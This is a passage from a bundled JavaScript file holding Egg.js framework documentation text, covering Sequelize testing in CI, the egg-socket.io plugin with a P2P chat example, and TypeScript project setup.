      const res = await app.httpRequest().get(\`/users/\${user.id}\`);
      assert(res.status === 200);
      assert(res.body.age === user.age);
    });
  });

  describe('POST /users', () => {
    it('should work', async () => {
      app.mockCsrf();
      let res = await app.httpRequest().post('/users').send({
        age: 10,
        name: 'name',
      });
      assert(res.status === 201);
      assert(res.body.id);

      res = await app.httpRequest().get(\`/users/\${res.body.id}\`);
      assert(res.status === 200);
      assert(res.body.name === 'name');
    });
  });

  describe('DELETE /users/:id', () => {
    it('should work', async () => {
      const user = await app.factory.create('user');

      app.mockCsrf();
      const res = await app.httpRequest().delete(\`/users/\${user.id}\`);
      assert(res.status === 200);
    });
  });
});
`,paraId:55,tocIndex:4},{value:"Finally, if we need to run unit tests in the CI, we need to ensure that we perform a migration to ensure data structure updates before executing the test code. For example, we declare ",paraId:56,tocIndex:4},{value:"scripts.ci",paraId:56,tocIndex:4},{value:" in ",paraId:56,tocIndex:4},{value:"package.json",paraId:56,tocIndex:4},{value:" to execute the unit test in the CI environment:",paraId:56,tocIndex:4},{value:`{
  "scripts": {
    "ci": "eslint . && NODE_ENV=test npx sequelize db:migrate && egg-bin cov"
  }
}
`,paraId:57,tocIndex:4},{value:"A more complete example can be found in ",paraId:58,tocIndex:5},{value:"eggjs/examples/sequelize",paraId:58,tocIndex:5},{value:".",paraId:58,tocIndex:5},{value:"We also provide sequelize boilerplate that integrates the modules ",paraId:59,tocIndex:6},{value:"egg-sequelize",paraId:59,tocIndex:6},{value:", ",paraId:59,tocIndex:6},{value:"sequelize-cli",paraId:59,tocIndex:6},{value:" and ",paraId:59,tocIndex:6},{value:"factory-girl",paraId:59,tocIndex:6},{value:" provided in this documentation. You can quickly initialize a new application based on it by ",paraId:59,tocIndex:6},{value:"npm init egg --type=sequelize",paraId:59,tocIndex:6},{value:".",paraId:59,tocIndex:6}]},20059:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(78913);const t=[{value:"Socket.IO",paraId:0},{value:" is a real-time application framework based on Node.js, which has a wide range of applications including instant messaging, notification and message push, real-time analysis and other scenarios.",paraId:0},{value:"WebSocket originated from the growing demand for real-time communication in web development, compared with http-based polling, which greatly saves network bandwidth and reduces server performance consumption. ",paraId:1},{value:"Socket.IO",paraId:1},{value:" supports both websockets and polling. The data transmission method is compatible with the browser and does not support the communication requirements under the WebSocket scenario.",paraId:1},{value:"The framework provides the ",paraId:2},{value:"egg-socket.io",paraId:2},{value:" plugin with the following development rules added:",paraId:2},{value:`namespace: define the namespace by means of configuration
\xA0- middleware: establish / disconnect every socket connection, preprocess every message / data transfer
\xA0- controller: response socket.io event
\xA0- router: unify the processing configuration of socket.io event and frame routing`,paraId:3},{value:`$ npm i egg-socket.io --save
`,paraId:4,tocIndex:1},{value:"Enable the plugin:",paraId:5,tocIndex:1},{value:`// {app_root} /config/plugin.js
exports.io = {
  enable: true,
  package: 'egg-socket.io',
};
`,paraId:6,tocIndex:1},{value:`// {app_root} / config / config. $ {env} .js
exports.io = {
  init: {}, // passed to engine.io
  namespace: {
    '/': {
      connectionMiddleware: [],
      packetMiddleware: [],
    },
    '/ example': {
      connectionMiddleware: [],
      packetMiddleware: [],
    },
  },
};
`,paraId:7,tocIndex:2},{value:"Namespaces are ",paraId:8,tocIndex:2},{value:"/",paraId:8,tocIndex:2},{value:" and ",paraId:8,tocIndex:2},{value:"/ example",paraId:8,tocIndex:2},{value:", not",paraId:8,tocIndex:2},{value:"example",paraId:8,tocIndex:2},{value:"uws",paraId:9},{value:"Egg's socket is using ",paraId:10,tocIndex:3},{value:"ws",paraId:10,tocIndex:3},{value:", ",paraId:10,tocIndex:3},{value:"uws",paraId:10,tocIndex:3},{value:" is deprecated due to ",paraId:10,tocIndex:3},{value:"some reasons",paraId:10,tocIndex:3},{value:".",paraId:10,tocIndex:3},{value:`
If you insist using `,paraId:10,tocIndex:3},{value:"uws",paraId:10,tocIndex:3},{value:" instead of the default ",paraId:10,tocIndex:3},{value:"ws",paraId:10,tocIndex:3},{value:", you can config like this:",paraId:10,tocIndex:3},{value:`// {app_root} / config / config. $ {env} .js
exports.io = {
  init: { wsEngine: 'uws' }, // default: ws
};
`,paraId:11,tocIndex:3},{value:"redis",paraId:9},{value:"egg-socket.io",paraId:12,tocIndex:4},{value:" has built-in redis support via ",paraId:12,tocIndex:4},{value:"socket.io-redis",paraId:12,tocIndex:4},{value:". In cluster mode, the use of redis can make it relatively simple to achieve information sharing of clients/rooms and so on",paraId:12,tocIndex:4},{value:`// {app_root} / config / config. $ {env} .js
exports.io = {
\xA0\xA0redis: {
\xA0\xA0\xA0\xA0host: {redis server host}
\xA0\xA0\xA0\xA0port: {redis server port},
\xA0\xA0\xA0\xA0auth_pass: {redis server password},
\xA0\xA0\xA0\xA0db: 0,
\xA0\xA0},
};
`,paraId:13,tocIndex:4},{value:"When ",paraId:14,tocIndex:4},{value:"redis",paraId:14,tocIndex:4},{value:` is turned on, the program tries to connect to the redis server at startup
Here `,paraId:14,tocIndex:4},{value:"redis",paraId:14,tocIndex:4},{value:" is only used to store connection instance information, see ",paraId:14,tocIndex:4},{value:"# server.adapter",paraId:14,tocIndex:4},{value:"Note:",paraId:15,tocIndex:4},{value:`
If the project also uses the `,paraId:15,tocIndex:4},{value:"egg-redis",paraId:15,tocIndex:4},{value:", please configure it separately. Do not share it.",paraId:15,tocIndex:4},{value:"If the framework is started in cluster mode, the socket.io protocol implementation needs sticky feature support, otherwise it will not work in multi-process mode.",paraId:16,tocIndex:5},{value:"Due to the design of socket.io, a multi-process server must be in the sticky working mode. As a result, you need the need to pass parameter ",paraId:17,tocIndex:5},{value:"--sticky",paraId:17,tocIndex:5},{value:" when starting the cluster.",paraId:17,tocIndex:5},{value:"Modify the ",paraId:18,tocIndex:5},{value:"npm scripts",paraId:18,tocIndex:5},{value:" script in",paraId:18,tocIndex:5},{value:"package.json",paraId:18,tocIndex:5},{value:":",paraId:18,tocIndex:5},{value:`{
\xA0\xA0"scripts": {
\xA0\xA0\xA0\xA0"dev": "egg-bin dev --sticky",
\xA0\xA0\xA0\xA0"start": "egg-scripts start --sticky"
\xA0\xA0}
}
`,paraId:19,tocIndex:5},{value:"Nginx configuration",paraId:20,tocIndex:5},{value:`location / {
\xA0\xA0proxy_set_header Upgrade $ http_upgrade;
\xA0\xA0proxy_set_header Connection "upgrade";
\xA0\xA0proxy_set_header X-Forwarded-For $ proxy_add_x_forwarded_for;
\xA0\xA0proxy_set_header Host $ host;
\xA0\xA0proxy_pass http://127.0.0.1:7001;
}
`,paraId:21,tocIndex:5},{value:"egg-socket.io",paraId:9},{value:"The directory structure of project which has enabled the ",paraId:22,tocIndex:6},{value:"egg-socket.io",paraId:22,tocIndex:6},{value:" is as follows:",paraId:22,tocIndex:6},{value:`chat
\u251C\u2500\u2500 app
\u2502 \u251C\u2500\u2500 extend
\u2502 \u2502 \u2514\u2500\u2500 helper.js
\u2502 \u251C\u2500\u2500 io
\u2502 \u2502 \u251C\u2500\u2500 controller
\u2502 \u2502 \u2502 \u2514\u2500\u2500 default.js
\u2502 \u2502 \u2514\u2500\u2500 middleware
\u2502 \u2502 \u251C\u2500\u2500 connection.js
\u2502 \u2502 \u2514\u2500\u2500 packet.js
\u2502 \u2514\u2500\u2500 router.js
\u251C\u2500\u2500 config
\u2514\u2500\u2500 package.json
`,paraId:23,tocIndex:6},{value:"Note: The corresponding files are in the app / io directory",paraId:24,tocIndex:6},{value:"Middleware has the following two scenarios:",paraId:25,tocIndex:7},{value:"Connection",paraId:26,tocIndex:7},{value:"Packet",paraId:26,tocIndex:7},{value:"It is configured in each namespace, respectively, according to the scenarios given above.",paraId:27,tocIndex:7},{value:"Note:",paraId:28,tocIndex:7},{value:"If we enable the framework middleware, you will find the following directory in the project:",paraId:29,tocIndex:7},{value:"app / middleware",paraId:30,tocIndex:7},{value:": framework middleware",paraId:30,tocIndex:7},{value:"app / io / middleware",paraId:30,tocIndex:7},{value:": plugin middleware",paraId:30,tocIndex:7},{value:"the difference:",paraId:31,tocIndex:7},{value:"Framework middleware is based on http model design to handle http requests.",paraId:32,tocIndex:7},{value:"Plugin middleware based socket model design, processing socket.io request.",paraId:32,tocIndex:7},{value:"Although the framework tries to unify the style through plugins, it is important to note that their usage scenarios are different. For details, please see: ",paraId:33,tocIndex:7},{value:"# 1416",paraId:33,tocIndex:7},{value:"Fires when each client connects or quits. Therefore, we usually perform authorization authentication at this step, and deal with the failed clients.",paraId:34,tocIndex:8},{value:`// {app_root} /app/io/middleware/connection.js
module.exports = (app) => {
  return async (ctx, next) => {
    ctx.socket.emit('res', 'connected!');
    await next(); // execute when disconnect.
    console.log('disconnection!');
  };
};
`,paraId:35,tocIndex:8},{value:"Kick out the user example:",paraId:36,tocIndex:8},{value:`const tick = (id, msg) => {
  logger.debug('# tick', id, msg);
  socket.emit(id, msg);
  app.io.of('/').adapter.remoteDisconnect(id, true, (err) => {
    logger.error(err);
  });
};
`,paraId:37,tocIndex:8},{value:"At the same time, the current connection can also be simple to deal with:",paraId:38,tocIndex:8},{value:`// {app_root} /app/io/middleware/connection.js
module.exports = (app) => {
  return async (ctx, next) => {
    if (true) {
      ctx.socket.disconnect();
      return;
    }
    await next();
    console.log('disconnection!');
  };
};
`,paraId:39,tocIndex:8},{value:"Acts on each data packet (each message). In the production environment, it is usually used to preprocess messages, or it is used to decrypt encrypted messages.",paraId:40,tocIndex:9},{value:`// {app_root} /app/io/middleware/packet.js
module.exports = (app) => {
  return async (ctx, next) => {
    ctx.socket.emit('res', 'packet received!');
    console.log('packet:', ctx.packet);
    await next();
  };
};
`,paraId:41,tocIndex:9},{value:"A controller deals with the events sent by the client. Since it inherits the ",paraId:42,tocIndex:10},{value:"egg.controller",paraId:42,tocIndex:10},{value:", it has the following member objects:",paraId:42,tocIndex:10},{value:"ctx",paraId:43,tocIndex:10},{value:"app",paraId:43,tocIndex:10},{value:"service",paraId:43,tocIndex:10},{value:"config",paraId:43,tocIndex:10},{value:"logger",paraId:43,tocIndex:10},{value:"For details, refer to the [Controller] (../ basics / controller.md) documentation",paraId:44,tocIndex:10},{value:`// {app_root} /app/io/controller/default.js
'use strict';

const Controller = require('egg').Controller;

class DefaultController extends Controller {
  async ping() {
    const { ctx, app } = this;
    const message = ctx.args[0];
    await ctx.socket.emit('res', \`Hi! I've got your message: $ {message}\`);
  }
}

module.exports = DefaultController;

// or async functions

exports.ping = async function () {
  const message = this.args[0];
  await this.socket.emit('res', \`Hi! I've got your message: $ {message}\`);
};
`,paraId:45,tocIndex:10},{value:"Routing is responsible for passing various events received by the socket to the corresponding controllers.",paraId:46,tocIndex:11},{value:`// {app_root} /app/router.js

module.exports = (app) => {
  const { router, controller, io } = app; // default
  router.get('/', controller.home.index); // socket.io
  io.of('/').route('server', io.controller.home.server);
};
`,paraId:47,tocIndex:11},{value:"Note:",paraId:48,tocIndex:11},{value:"Nsp has the following system events:",paraId:49,tocIndex:11},{value:"disconnecting",paraId:50,tocIndex:11},{value:" doing the disconnect",paraId:50,tocIndex:11},{value:"disconnect",paraId:50,tocIndex:11},{value:" connection has disconnected.",paraId:50,tocIndex:11},{value:"error",paraId:50,tocIndex:11},{value:" Error occurred",paraId:50,tocIndex:11},{value:'The namespace is usually meant to be assigned to different access points or paths. If the client does not specify a nsp, it is assigned to "/" by default.',paraId:51,tocIndex:13},{value:"In socket.io we use the ",paraId:52,tocIndex:13},{value:"of",paraId:52,tocIndex:13},{value:" to divide the namespace; given that nsp is usually pre-defined and relatively fixed, the framework encapsulates it and uses configuration to partition different namespaces.",paraId:52,tocIndex:13},{value:`// socket.io
var nsp = io.of('/my-namespace');
nsp.on('connection', function (socket) {
  console.log('someone connected');
});
nsp.emit('hi', 'everyone!');

// egg
exports.io = {
  namespace: {
    '/': {
      connectionMiddleware: [],
      packetMiddleware: [],
    },
  },
};
`,paraId:53,tocIndex:13},{value:"Room exists in nsp and is added or left by the join/leave method; the method used in the framework is the same;",paraId:54,tocIndex:14},{value:`Const room = 'default_room';

Module.exports = app => {
\xA0\xA0 return async (ctx, next) => {
\xA0\xA0\xA0\xA0 ctx.socket.join(room);
\xA0\xA0\xA0\xA0 ctx.app.io.of('/').to(room).emit('online', { msg: 'welcome', id: ctx.socket.id });
\xA0\xA0\xA0\xA0 await next();
\xA0\xA0\xA0\xA0 console.log('disconnection!');
\xA0\xA0 };
};
`,paraId:55,tocIndex:14},{value:"Note:",paraId:56,tocIndex:14},{value:" Each socket connection will have a random and unpredictable unique id ",paraId:56,tocIndex:14},{value:"Socket#id",paraId:56,tocIndex:14},{value:" and will automatically be added to the room named after this ",paraId:56,tocIndex:14},{value:"id",paraId:56,tocIndex:14},{value:"Here we use ",paraId:57,tocIndex:15},{value:"egg-socket.io",paraId:57,tocIndex:15},{value:" to do a small example which supports p2p chat",paraId:57,tocIndex:15},{value:"The UI-related content is not rewritten. It can be called via window.socket",paraId:58,tocIndex:16},{value:`// browser
const log = console.log;

window.onload = function () {
  // init
  const socket = io('/', {
    // Actual use can pass parameters here
    query: {
      room: 'demo',
      userId: \`client_\${Math.random()}\`,
    },

    transports: ['websocket'],
  });

  socket.on('connect', () => {
    const id = socket.id;

    log('#connect,', id, socket); // receive online user information

    // listen for its own id to implement p2p communication
    socket.on(id, (msg) => {
      log('#receive,', msg);
    });
  });

  socket.on('online', (msg) => {
    log('#online,', msg);
  });

  // system events
  socket.on('disconnect', (msg) => {
    log('#disconnect', msg);
  });

  socket.on('disconnecting', () => {
    log('#disconnecting');
  });

  socket.on('error', () => {
    log('#error');
  });

  window.socket = socket;
};
`,paraId:59,tocIndex:16},{value:"The API provided by the WeChat applet is WebSocket, and socket.io is the upper encapsulation of Websocket. Therefore, we cannot directly use the API connection of the applet. You can use something like [wxapp-socket-io] (",paraId:60,tocIndex:17},{value:"https://github.com/wxsocketio",paraId:60,tocIndex:17},{value:" /wxapp-socket-io) to adapt to the library.",paraId:60,tocIndex:17},{value:"The sample code is as follows:",paraId:61,tocIndex:17},{value:`// Small program-side sample code
import io from 'vendor/wxapp-socket-io.js';

const socket = io('ws://127.0.0.1:7001');
socket.on('connect', function () {
  socket.emit('chat', 'hello world!');
});
socket.on('res', (msg) => {
  console.log('res from server: %s!', msg);
});
`,paraId:62,tocIndex:17},{value:"The following is part of the demo code and explains the role of each method:",paraId:63,tocIndex:18},{value:`// {app_root}/config/config.\${env}.js
exports.io = {
  namespace: {
    '/': {
      connectionMiddleware: ['auth'],
      packetMiddleware: [], // processing for message is not implemented temporarily
    },
  }, // Data sharing through redis in cluster mode

  redis: {
    host: '127.0.0.1',
    port: 6379,
  },
};
`,paraId:64,tocIndex:19},{value:"Framework extensions for encapsulating data formats",paraId:65,tocIndex:20},{value:`// {app_root}/app/extend/helper.js

module.exports = {
  parseMsg(action, payload = {}, metadata = {}) {
    const meta = Object.assign(
      {},
      {
        timestamp: Date.now(),
      },
      metadata,
    );

    return {
      data: {
        action,
        payload,
      },
      meta,
    };
  },
};
`,paraId:66,tocIndex:20},{value:"Format\uFF1A",paraId:67,tocIndex:20},{value:`{
  data: {
    action: 'exchange',  // 'deny' || 'exchange' || 'broadcast'
    payload: {},
  },
  meta:{
    timestamp: 1512116201597,
    client: '/webrtc#nNx88r1c5WuHf9XuAAAB',
    target: '/webrtc#nNx88r1c5WuHf9XuAAAB'
  },
}
`,paraId:68,tocIndex:20},{value:"egg-socket.io",paraId:69,tocIndex:21},{value:" middleware handles socket connection handling",paraId:69,tocIndex:21},{value:`// {app_root}/app/io/middleware/auth.js

const PREFIX = 'room';

module.exports = () => {
  return async (ctx, next) => {
    const { app, socket, logger, helper } = ctx;
    const id = socket.id;
    const nsp = app.io.of('/');
    const query = socket.handshake.query; // User Info

    const { room, userId } = query;
    const rooms = [room];

    logger.debug('#user_info', id, room, userId);

    const tick = (id, msg) => {
      logger.debug('#tick', id, msg); // Send message before kicking user

      socket.emit(id, helper.parseMsg('deny', msg)); // Call the adapter method to kick out the user and the client triggers the disconnect event

      nsp.adapter.remoteDisconnect(id, true, (err) => {
        logger.error(err);
      });
    }; // Check if the room exists, kick it out if it doesn't exist // Note: here app.redis has nothing to do with the plugin, it can be replaced by other storage

    const hasRoom = await app.redis.get(\`\${PREFIX}:\${room}\`);

    logger.debug('#has_exist', hasRoom);

    if (!hasRoom) {
      tick(id, {
        type: 'deleted',
        message: 'deleted, room has been deleted.',
      });
      return;
    } // When the user joins

    nsp.adapter.clients(rooms, (err, clients) => {
      // Append current socket information to clients
      clients[id] = query; // Join room

      socket.join(room);

      logger.debug('#online_join', _clients); // Update online user list

      nsp.to(room).emit('online', {
        clients,
        action: 'join',
        target: 'participator',
        message: \`User(\${id}) joined.\`,
      });
    });

    await next(); // When the user leaves

    nsp.adapter.clients(rooms, (err, clients) => {
      logger.debug('#leave', room);

      const _clients = {};
      clients.forEach((client) => {
        const _id = client.split('#')[1];
        const _client = app.io.sockets.sockets[_id];
        const _query = _client.handshake.query;
        _clients[client] = _query;
      });

      logger.debug('#online_leave', _clients); // Update online user list

      nsp.to(room).emit('online', {
        clients: _clients,
        action: 'leave',
        target: 'participator',
        message: \`User(\${id}) leaved.\`,
      });
    });
  };
};
`,paraId:70,tocIndex:21},{value:"Data exchange of P2P communication is through exchange",paraId:71,tocIndex:22},{value:`// {app_root}/app/io/controller/nsp.js
const Controller = require('egg').Controller;

class NspController extends controller {
  async exchange() {
    const { ctx, app } = this;
    const nsp = app.io.of('/');
    const message = ctx.args[0] || {};
    const socket = ctx.socket;
    const client = socket.id;

    try {
      const { target, payload } = message;
      if (!target) return;
      const msg = ctx.helper.parseMsg('exchange', payload, { client, target });
      nsp.emit(target, msg);
    } catch (error) {
      app.logger.error(error);
    }
  }
}

module.exports = NspController;
`,paraId:72,tocIndex:22},{value:`// {app_root}/app/router.js
module.exports = (app) => {
  const { router, controller, io } = app;
  router.get('/', controller.home.index); // socket.io

  io.of('/').route('exchange', io.controller.nsp.exchange);
};
`,paraId:73,tocIndex:23},{value:"Open two tab pages and call up the console:",paraId:74,tocIndex:23},{value:`socket.emit('exchange', {
  target: '/webrtc#Dkn3UXSu8_jHvKBmAAHW',
  payload: {
    msg: 'test',
  },
});
`,paraId:75,tocIndex:23},{value:"socket.io",paraId:76,tocIndex:24},{value:"egg-socket.io",paraId:76,tocIndex:24},{value:"egg-socket.io example",paraId:76,tocIndex:24}]},8396:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(7385);const t=[{value:"TypeScript",paraId:0},{value:" is a typed superset of JavaScript that compiles to plain JavaScript.",paraId:0},{value:"For a large number of enterprises' applications, TypeScript's static type checking, intellisense, friendly IDE are valuable. For more please see ",paraId:1},{value:"System Research Report For TypeScript",paraId:1},{value:".",paraId:1},{value:"However, we've met some problems influencing users' experience when developing Egg in TypeScript:",paraId:2},{value:"The most outstanding Loader Mechanism (Auto-loading) makes TS not analyze dependencies in static.",paraId:3},{value:"How to validate and show intellisense in ",paraId:3},{value:"config.{env}.js",paraId:3},{value:", when we modify settings by plugin and these configurations are automatically merged?",paraId:3},{value:"During the period of developing, ",paraId:3},{value:"tsc -w",paraId:3},{value:" is created as an independent process to build up codes, it makes us entangled about where to save the temporary files, and the complicated ",paraId:3},{value:"npm scripts",paraId:3},{value:".",paraId:3},{value:"How to map to the TS source files instead of compiled js files in unit tests, coverage tests and error stacks online?",paraId:3},{value:"This article mainly describes:",paraId:4},{value:"Developing principles of TS for the application layer.",paraId:5},{value:"How do we solve the problem for developers with the help of the tool chain so that they have no scene about it and keep in consistency",paraId:5},{value:"For more about this tossing process, please see ",paraId:6},{value:"[RFC] TypeScript tool support",paraId:6},{value:".",paraId:6},{value:"A quick initialization through the boilerplate:",paraId:7,tocIndex:0},{value:`$ mkdir showcase && cd showcase
$ npm init egg --type=ts
$ npm i
$ npm run dev
`,paraId:8,tocIndex:0},{value:"The boilerplate above will create a very simple example, for a detailed one please see ",paraId:9,tocIndex:0},{value:"eggjs/examples/hackernews-async-ts",paraId:9,tocIndex:0},{value:"Some constraints:",paraId:10,tocIndex:1},{value:"We've no plans for re-writing Egg in TS yet.",paraId:11,tocIndex:1},{value:"Egg itself, with its plugin, will have corresponding ",paraId:11,tocIndex:1},{value:"index.d.ts",paraId:11,tocIndex:1},{value:" for users to use easily.",paraId:11,tocIndex:1},{value:"TypeScript only belongs to a communication practice. We support it to some extent with our tool chain.",paraId:11,tocIndex:1},{value:"TypeScript's version MUST BE 2.8 at least.",paraId:11,tocIndex:1},{value:"There's no obvious difference between TS's project and Egg's in js:",paraId:12,tocIndex:1},{value:"The suffix is ",paraId:13,tocIndex:1},{value:"ts",paraId:13,tocIndex:1},{value:" in ",paraId:13,tocIndex:1},{value:"typescript",paraId:13,tocIndex:1},{value:" style",paraId:13,tocIndex:1},{value:"typings",paraId:13,tocIndex:1},{value:" folder is used to put ",paraId:13,tocIndex:1},{value:"d.ts",paraId:13,tocIndex:1},{value:" files (most of them are automatically created)",paraId:13,tocIndex:1},{value:`showcase
\u251C\u2500\u2500 app
\u2502   \u251C\u2500\u2500 controller
\u2502   \u2502   \u2514\u2500\u2500 home.ts
\u2502   \u251C\u2500\u2500 service
\u2502   \u2502   \u2514\u2500\u2500 news.ts
\u2502   \u2514\u2500\u2500 router.ts
\u251C\u2500\u2500 config
\u2502   \u251C\u2500\u2500 config.default.ts
\u2502   \u251C\u2500\u2500 config.local.ts
\u2502   \u251C\u2500\u2500 config.prod.ts
\u2502   \u2514\u2500\u2500 plugin.ts
\u251C\u2500\u2500 test
\u2502   \u2514\u2500\u2500 **/*.test.ts
\u251C\u2500\u2500 typings
\u2502   \u2514\u2500\u2500 **/*.d.ts
\u251C\u2500\u2500 README.md
\u251C\u2500\u2500 package.json
\u251C\u2500\u2500 tsconfig.json
\u2514\u2500\u2500 tslint.json
`,paraId:14,tocIndex:1},{value:`// app/controller/home.ts
import { Controller } from 'egg';

export default class HomeController extends Controller {
  public async index() {
    const { ctx, service } = this;
    const page = ctx.query.page;
    const result = await service.news.list(page);
    await ctx.render('home.tpl', result);
  }
}
`,paraId:15,tocIndex:2},{value:`// app/router.ts
import { Application } from 'egg';

export default (app: Application) => {
  const { router, controller } = app;
  router.get('/', controller.home.index);
};
`,paraId:16,tocIndex:3},{value:`// app/service/news.ts
import { Service } from 'egg';

export default class NewsService extends Service {
  public async list(page?: number): Promise<NewsItem[]> {
    return [];
  }
}

export interface NewsItem {
  id: number;
  title: string;
}
`,paraId:17,tocIndex:4},{value:`// app/middleware/robot.ts

import { Context } from 'egg';

// Your own middleware here
export default function fooMiddleware() {
  return async (ctx: Context, next: any) => {
    // Get configs like this\uFF1A
    // const config = ctx.app.config;
    // config.xxx....
    await next();
  };
}
`,paraId:18,tocIndex:5},{value:"When some property's name in config matches your middleware files's, Egg will automatically read out all of its sub properties.",paraId:19,tocIndex:5},{value:"Let's assume you've got a middleware named ",paraId:20,tocIndex:5},{value:"uuid",paraId:20,tocIndex:5},{value:", and its config.default.js is:",paraId:20,tocIndex:5},{value:`'use strict';

import { EggAppConfig, PowerPartial } from 'egg';

export default function(appInfo: EggAppConfig) {
  const config = {} as PowerPartial<EggAppConfig>;

  config.keys = appInfo.name + '123123';

  config.middleware = ['uuid'];

  config.security = {
    csrf: {
      ignore: '123',
    },
  };

  const bizConfig = {
    local: {
      msg: 'local',
    },

    uuid: {
      name: 'ebuuid',
      maxAge: 1000 * 60 * 60 * 24 * 365 * 10,
    },
  };

  return {
    ...config,
    ...bizConfig,
  };
}
`,paraId:21,tocIndex:5},{value:"In ",paraId:22,tocIndex:5},{value:"uuid",paraId:22,tocIndex:5},{value:" middleware:",paraId:22,tocIndex:5},{value:`// app/middleware/uuid.ts

import { Context, Application, EggAppConfig } from 'egg';

export default function uuid(
  options: EggAppConfig['uuid'],
  app: Application,
): any {
  return async (ctx: Context, next: () => Promise<any>) => {
    // The 'name' is just the sub prop in uuid in the config.default.js
    console.info(options.name);
    await next();
  };
}
`,paraId:23,tocIndex:5},{value:"Notice: The return value of any middleware must be ",paraId:24,tocIndex:5},{value:"any",paraId:24,tocIndex:5},{value:" now, otherwise there's a compiling error about the compatibility of context between Koa's context in route.get/all and Egg's Context.",paraId:24,tocIndex:5},{value:`// app/extend/context.ts
import { Context } from 'egg';

export default {
  isAjax(this: Context) {
    return this.get('X-Requested-With') === 'XMLHttpRequest';
  },
};

// app.ts
export default (app) => {
  app.beforeStart(async () => {
    await Promise.resolve('egg + ts');
  });
};
`,paraId:25,tocIndex:6},{value:"Config is a little complicated, because it supports:",paraId:26,tocIndex:7},{value:'In Controller and Service, we need "multi-layer" intellisense configurations, they are automatically related to each other.',paraId:27,tocIndex:7},{value:"In Config, ",paraId:27,tocIndex:7},{value:"config.view = {}",paraId:27,tocIndex:7},{value:" will also support intellisense.",paraId:27,tocIndex:7},{value:"In ",paraId:27,tocIndex:7},{value:"config.{env}.ts",paraId:27,tocIndex:7},{value:", we can use customized configuration settings with intellisense in ",paraId:27,tocIndex:7},{value:"config.default.ts",paraId:27,tocIndex:7},{value:".",paraId:27,tocIndex:7},{value:`// app/config/config.default.ts
import { EggAppInfo, EggAppConfig, PowerPartial } from 'egg';

export default (appInfo: EggAppInfo) => {
  const config = {} as PowerPartial<EggAppConfig>;

  // Override the configs of framework and plugins
  config.keys = appInfo.name + '123456';
  config.view = {
    defaultViewEngine: 'nunjucks',
    mapping: {
      '.tpl': 'nunjucks',
    },
  };

  // Configs of application
  const bizConfig = {};
  bizConfig.news = {
    pageSize: 30,
    serverUrl: 'https://hacker-news.firebaseio.com/v0',
  };

  // We merge the business logic's configs into AppConfig as the return value
  return {
    // If we directly return you config and merge it into EggAppConfig, there'll be a circulate type error
    ...(config as {}),
    ...bizConfig,
  };
};
`,paraId:28,tocIndex:7},{value:"Notice: We need ",paraId:29,tocIndex:7},{value:"egg-ts-helper",paraId:29,tocIndex:7},{value:" to merge the returned config type from ",paraId:29,tocIndex:7},{value:"config.default.js",paraId:29,tocIndex:7},{value:" into egg's ",paraId:29,tocIndex:7},{value:"EggAppConfig",paraId:29,tocIndex:7},{value:".",paraId:29,tocIndex:7},{value:"When ",paraId:30,tocIndex:7},{value:"EggAppConfig",paraId:30,tocIndex:7},{value:" is merged with the returned type of ",paraId:30,tocIndex:7},{value:"config.default.ts",paraId:30,tocIndex:7},{value:", we can also get the intellisenses of our customized configs in ",paraId:30,tocIndex:7},{value:"config.default.ts",paraId:30,tocIndex:7},{value:" like this following:",paraId:30,tocIndex:7},{value:`// app/config/config.local.ts
import { EggAppConfig } from 'egg';

export default () => {
  const config = {} as PowerPartial<EggAppConfig>;
  // Now we can get the intellisenses of 'news'
  config.news = {
    pageSize: 20,
  };
  return config;
};
`,paraId:31,tocIndex:7},{value:"Remarks:",paraId:32,tocIndex:7},{value:"Conditional Types",paraId:33,tocIndex:7},{value:" is the KEY to solving config's intellisense.",paraId:33,tocIndex:7},{value:"Anyone if interested in this, have a look at the implement of ",paraId:33,tocIndex:7},{value:"PowerPartial",paraId:33,tocIndex:7},{value:" at ",paraId:33,tocIndex:7},{value:"egg/index.d.ts",paraId:33,tocIndex:7},{value:".",paraId:33,tocIndex:7},{value:`// {egg}/index.d.ts
type PowerPartial<T> = {
  [U in keyof T]?: T[U] extends {} ? PowerPartial<T[U]> : T[U];
};
`,paraId:34,tocIndex:7},{value:`// config/plugin.ts
import { EggPlugin } from 'egg';

const plugin: EggPlugin = {
  static: true,
  nunjucks: {
    enable: true,
    package: 'egg-view-nunjucks',
  },
};

export default plugin;
`,paraId:35,tocIndex:8},{value:`// app.ts
import { Application, IBoot } from 'egg';

export default class FooBoot implements IBoot {
  private readonly app: Application;

  constructor(app: Application) {
    this.app = app;
  }

  configWillLoad() {
    // Ready to call configDidLoad,
    // Config, plugin files are referred,
    // this is the last chance to modify the config.
  }

  configDidLoad() {
    // Config, plugin files have loaded.
  }

  async didLoad() {
    // All files have loaded, start plugin here.
  }

  async willReady() {
    // All plugins have started, can do some thing before app ready.
  }

  async didReady() {
    // Worker is ready, can do some things
    // don't need to block the app boot.
  }

  async serverDidReady() {
    // Server is listening.
  }

  async beforeClose() {
    // Do some thing before app close.
  }
}
`,paraId:36,tocIndex:9},{value:"The folder is the principle of TS, where ",paraId:37,tocIndex:10},{value:"**/*.d.ts",paraId:37,tocIndex:10},{value:" are automatically recognized.",paraId:37,tocIndex:10},{value:"Put developers' hand-writing suggestions in ",paraId:38,tocIndex:10},{value:"typings/index.d.ts",paraId:38,tocIndex:10},{value:".",paraId:38,tocIndex:10},{value:"Tools will automatically generate ",paraId:38,tocIndex:10},{value:"typings/{app,config}/**.d.ts",paraId:38,tocIndex:10},{value:". Please DO NOT change manually (See below).",paraId:38,tocIndex:10},{value:"egg-bin",paraId:39,tocIndex:12},{value:" has built ",paraId:39,tocIndex:12},{value:"ts-node",paraId:39,tocIndex:12},{value:" in, and ",paraId:39,tocIndex:12},{value:"egg loader",paraId:39,tocIndex:12},{value:" will automatically load ",paraId:39,tocIndex:12},{value:"*.ts",paraId:39,tocIndex:12},{value:" and compile them in memory during the period of development.",paraId:39,tocIndex:12},{value:"Now ",paraId:40,tocIndex:12},{value:"dev",paraId:40,tocIndex:12},{value:" / ",paraId:40,tocIndex:12},{value:"debug",paraId:40,tocIndex:12},{value:" / ",paraId:40,tocIndex:12},{value:"test",paraId:40,tocIndex:12},{value:" / ",paraId:40,tocIndex:12},{value:"cov",paraId:40,tocIndex:12},{value:" are supported.",paraId:40,tocIndex:12},{value:"Developers only need to config in ",paraId:41,tocIndex:12},{value:"package.json",paraId:41,tocIndex:12},{value:" simply:",paraId:41,tocIndex:12},{value:`{
  "name": "showcase",
  "egg": {
    "typescript": true
  }
}
